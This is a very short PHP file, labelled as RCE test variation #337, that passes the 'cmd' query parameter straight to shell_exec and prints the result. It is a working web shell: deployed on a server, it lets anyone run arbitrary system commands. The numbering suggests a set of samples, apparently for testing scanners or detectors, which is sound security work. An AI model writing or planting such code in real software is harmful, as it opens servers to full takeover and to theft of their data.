<?php
// RCE test variation #337
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>